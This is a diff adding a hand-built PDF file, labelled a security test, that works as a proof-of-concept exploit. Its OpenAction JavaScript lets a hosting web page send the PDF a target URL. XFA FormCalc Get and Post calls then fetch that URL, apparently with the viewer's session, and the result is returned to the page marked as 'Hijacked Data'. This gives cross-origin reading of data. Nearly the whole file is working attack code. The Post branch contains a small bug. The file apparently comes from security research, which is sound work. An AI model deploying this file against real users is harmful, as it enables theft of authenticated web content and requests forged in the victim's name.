@@ -1,0 +1,391 @@
+% Created by Soroush Dalili (@irsdl)
+%PDF-1.1
+
+1 0 obj
+<<
+	/Pages 2 0 R % Set to the Kids object
+	/AcroForm
+	<<
+	/Fields[3 0 R] % Set to the text field
+	/XFA 5 0 R % Set to the XDP form
+	>>
+	/OpenAction 
+		<<
+		/S /JavaScript
+		/JS(
+			// And here fun begins... chamber of JavaScript god.
+			var onloadInterval;
+			var myHostContainer;
+			var target="";
+			var postData="";
+			this.getField("mydata").multiline=true;
+			
+			function onErrorFunc( e ) {
+				var errMessage = "Error:" + e.toString();
+				// We like to alert this and that! we don't have enough money to pay for a fancy debugger!
+				app.alert(errMessage);
+
+				logIt(errMessage);
+			}
+			
+			function logIt(strMessage){
+				//this.getField("mydata").value += strMessage; // I cannot do this when I have XFA?
+				if(myHostContainer!=null && target!=""){
+					myHostContainer.postMessage([strMessage]);
+				}
+			}
+			
+			try{
+				this.disclosed = true; // To tell HTML that I'm all yours! no not really! just shares a function for onMessage!
+				if (this.external && this.hostContainer) {
+					function onMessageFunc( stringArray ) {
+						try{
+							target = stringArray[0];
+							if(stringArray[1])
+								postData = stringArray[1];
+							else
+								postData = "";
+							
+							// We have our target and everything set-up! If I don't delete my PDF file accidentally again, it should work fine!
+							var contents = "";
+							if(postData!="")
+								contents = objMy_fc_Form.func.Post(target,postData);
+							else
+								contents = objMy_fc_Form.func.Get(target);
+							
+							if(contents=="") 
+								contents = "Target page was not accessible."; // I'm so sorry master!
+							else
+								contents = "Hijacked Data: " + contents; // This is an apple! I want to eat it now! He said...
+							
+							logIt(contents);
+						}
+						catch(e){
+							onErrorFunc(e); 
+						}
+					}
+					
+					try {
+						if(!this.hostContainer.messageHandler); 
+						this.hostContainer.messageHandler = new Object(); 
+						this.hostContainer.messageHandler.myDoc = this; 
+						this.hostContainer.messageHandler.onMessage = onMessageFunc; 
+						this.hostContainer.messageHandler.onError = onErrorFunc; 
+						this.hostContainer.messageHandler.onDisclose = function(){ 
+							return true; 
+						};
+					}
+					catch(e){
+						onErrorFunc(e);
+					}
+					
+					function clearIntervals(){
+						app.clearInterval(onloadInterval);
+					}
+					
+					if(this.hostContainer) {
+						try{
+							// To announce that PDF is ready for action!
+							myHostContainer = this.hostContainer;
+							onloadInterval = app.setInterval("this.hostContainer.postMessage(['loaded','1']);",500);
+							app.setTimeOut("clearIntervals();",5000); // Keep sending the message for 5 seconds to make sure HTML will receive it
+						}
+						catch(e){
+							onErrorFunc(e);
+						}
+					}
+				}
+			}catch(e){
+				onErrorFunc(e);
+			}
+		)
+		>>
+	/Type /Catalog
+>>
+endobj
+
+2 0 obj
+<<
+	/Kids[
+	<<
+		/Parent 2 0 R
+%		/Contents[10 0 R] % For the content
+		/Annots 4 0 R % Set to the annotation which points to the field - I needed this to show the text box
+	>>
+	]
+	/Resources
+	<<
+		/ProcSet [ /PDF /Text ]
+	>>
+>>
+
+
+3 0 obj<<
+		/Rect[0 0 800 800]
+		/Subtype/Widget
+		/T(mydata)        % this is the name
+		/V(Hello World from PDF!)  % this is the value
+		/Type
+		/Annot
+		/FT
+		/Tx
+		/Subtype
+		/Widget
+		>>
+endobj
+
+4 0 obj[3 0 R]
+endobj
+
+
+% My XDP Form
+% Interaction between JavaScript and FormCalc
+% Got the idea from: blogs.adobe.com/formfeed/files/formfeed/fragments/scFormCalc.xdp and
+% http://blogs.adobe.com/formfeed/2009/02/calling_formcalc_functions_fro.html
+5 0 obj <<>>
+stream
+<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
+<config><present><pdf><interactive>1</interactive></pdf></present></config>
+<template xmlns="http://www.xfa.org/schema/xfa-template/2.8/">
+   <?formServer defaultPDFRenderFormat acrobat9.0static?>
+   <subform name="myXFAForm" locale="en_US" layout="tb">
+      <pageSet>
+         <pageArea>
+            <contentArea x="0.25in" y="0.25in" w="8in" h="10.5in"/>
+            <medium stock="letter" short="8.5in" long="11in"/>
+         </pageArea>
+      </pageSet>
+      <subform access="readOnly" h="19.05mm" name="fc" w="141.41mm">
+         <variables>
+            <script contentType="application/x-javascript" name="func">
+				var objDoc=-1;			
+				/** 
+				 * This script object contains a series of functions
+				 * that redirect their input to the corresponding formcalc
+				 * functions.
+				 * If you want to call these functions from an initialization script, 
+				 * be sure to place the fc subform at the front of the template. &lt;br/&gt;
+				 * Version 2: Added Get().  Use execEvent("enter") instead of the calculate event.
+				 * Calculate was introducing un-needed dependency tracking.
+				 */
+				var oVersionInfo = {
+					identifier:    "FormCalcFromJavaScript",
+					assetType:	   "fragment",
+					description:   "Support for FormCalc functions: Format(), Parse(), WordNum(), Uuid(), UnitValue(), Get()",
+					currentVersion: 2
+				};
+
+				/*global F P1 P2 NullValue ResultString */
+
+				/**
+				 * Format a value based on a picture
+				 * @param vPicture - the picture clause
+				 * @param vValue - The value to format
+				 * @return the formatted value. Empty string if the format fails.
+				 */
+				function Format(vPicture, vValue)
+				{
+					F.value = "Format";
+					P1.value = vPicture;
+					P2.value = vValue;
+					NullValue.value = vValue === null;
+					this.execEvent("enter");
+					return ResultString.value;
+				}
+
+				/**
+				 * Parse a value based on a picture
+				 * @param vPicture - the picture clause
+				 * @param vValue - The value to parse
+				 * @return the raw/canonical value. Empty string if the parse fails.
+				 */
+				function Parse(vPicture, vValue)
+				{
+					F.value = "Parse";
+					P1.value = vPicture;
+					P2.value = vValue;
+					this.execEvent("enter");
+					return ResultString.value;
+				}
+
+				/**
+				 * Convert a number into words.  Note that currently only English is supported.
+				 * @param vInputValue
+				 * @return the value expressed as words.
+				 */
+				function WordNum(vInputValue)
+				{
+					F.value = "WordNum";
+					// Make sure we convert all numeric input values to string
+					// all parameters to formcalc functions are strings
+					P1.value = vInputValue.toString();
+					this.execEvent("enter");
+					return ResultString.value;
+				}
+
+				/**
+				 * Return a Universally Unique Identifier (UUID) string.
+				 * @param vN1 identifies the format of UUID string requested:&lt;br/&gt;
+				 * if the value is 0, the returned UUID string will only contain hex octets.&lt;br/&gt;
+				 * if the value is 1, the returned UUID string will contain dash characters separating the sequences of hex octets, at fixed positions.
+				 * @return the uuid value string
+				 */
+				function Uuid(vN1)
+				{
+					F.value = "Uuid";
+					P1.value = vN1.toString();
+					this.execEvent("enter");
+					return ResultString.value;
+				}
+
+				/**
+				 * Returns the value of a unitspan after an optional unit conversion. 
+				 * A unitspan string consist of a number immediately followed by a unit name. 
+				 * Recognized unit names include:in, mm, cm, pt
+				 * @param vMeasurement -- the measurement string value
+				 * @param vUnits - the units to convert to
+				 * @return the numeric value in the requested units
+				 */
+				function UnitValue(vMeasurement, vUnits)
+				{
+					F.value = "UnitValue";
+					P1.value = vMeasurement;
+					P2.value = vUnits;
+					this.execEvent("enter");
+					// cast return value to the expected type.
+					return parseFloat(ResultString.value);
+				}
+
+				/**
+				 * Download the contents of the given URL.
+				 * @param vAddress -- the requested URL
+				 * @return the contents of the URL.
+				 */
+				function Get(vAddress)
+				{
+					F.value = "Get";
+					P1.value = vAddress;
+					this.execEvent("enter");
+					return ResultString.value;
+				}
+				
+				/**
+				 * Download the contents of the given URL.
+				 * @param vAddress -- the requested URL
+				 * @param content -- POST data
+				 * @return the contents of the URL.
+				 */
+				function Post(vAddress,content)
+				{
+					F.value = "Post";
+					P1.value = vAddress;
+					P2.value = content;
+					this.execEvent("enter");
+					return ResultString.value;
+				}
+				
+				function Test(){
+					//setTimeOut('app.alert(this.getField("mydata"))',3000);
+					//app.alert(app.getField);
+					return -1;
+				}
+		</script>
+		<?templateDesigner expand 1?></variables>
+		<bind match="none"/>
+		<event activity="initialize" name="event__initialize">
+			<script contentType="application/x-javascript">
+				// Define all the variables needed to pass parameters to/from the FormCalc functions
+				/*global fc */
+				
+				if (fc.variables.nodes.namedItem("F") === null) {
+					this.variables.nodes.append(xfa.form.createNode("text", "F"));
+					this.variables.nodes.append(xfa.form.createNode("text", "P1"));
+					this.variables.nodes.append(xfa.form.createNode("boolean", "NullValue"));
+					this.variables.nodes.append(xfa.form.createNode("text", "P2"));		
+					this.variables.nodes.append(xfa.form.createNode("text", "ResultString"));		
+				}
+				
+				// Record this for now as JavaScript god may not send us a better fruit! Adam said!
+				fc.func.objDoc=event.target;
+				
+				// We need to send this up where JavaScript god can use it! ;)
+				event.target.objMy_fc_Form = fc;
+				
+			</script>
+         </event>
+         <event activity="enter" name="event__enter">
+            <script contentType='application/x-formcalc'>
+				; execute the requested function based on the input 
+				; request parameters
+				if (F == "WordNum") then
+					ResultString = WordNum(P1)
+					
+				elseif (F == "Parse") then
+					ResultString = Parse(P1, P2)
+					
+				elseif (F == "Format") then
+					if (NullValue) then
+						ResultString = Format(P1, null)
+					else
+						ResultString = Format(P1, P2)
+					endif
+					
+				elseif (F == "Uuid") then
+					ResultString = Uuid(P1)
+					
+				elseif (F == "UnitValue") then
+					ResultString = UnitValue(P1, P2)
+
+				elseif (F == "Get") then
+					ResultString = Get(P1)
+					
+				elseif (F == "Post") then
+					ResultString = Get(P1, P2)
+						
+				else
+					ResultString = ""
+				endif
+			</script>
+         </event>
+         <?templateDesigner expand 1?>
+         <?templateDesigner isFragment yes?>
+         <?templateDesigner fragmentTitle scFormCalc?>
+         <?templateDesigner fragmentDescription Allow access to FormCalc built in functions from JavaScript?>
+	   </subform>
+   </subform>
+   <?originalXFAVersion http://www.xfa.org/schema/xfa-template/2.8/?>
+   <?templateDesigner FormTargetVersion 28?>
+   <?templateDesigner Rulers horizontal:1, vertical:1, guidelines:1, crosshairs:0?>
+   <?templateDesigner Zoom 56?></template>
+</xdp:xdp>
+endstream
+endobj
+
+6 0 obj
+<<
+/Producer (@irsdl)
+/Subject (Sec test)
+/Title (Sec test)
+/Author (root)
+/Keywords (Sec test)
+>>
+endobj
+
+% The following object is disabled which could be used in the content
+%10 0 obj
+%<<
+%>>
+%stream
+%	BT/default 10 Tf 1 0 0 1 1 715 Tm(Hello World!)Tj ET
+%endstream
+%endobj
+
+
+trailer
+<<
+	/Size 8
+	/ID [ (irsdl) (MyfancyPDF) ]
+	/Root 1 0 R
+	/Info 6 0 R
+>>
+
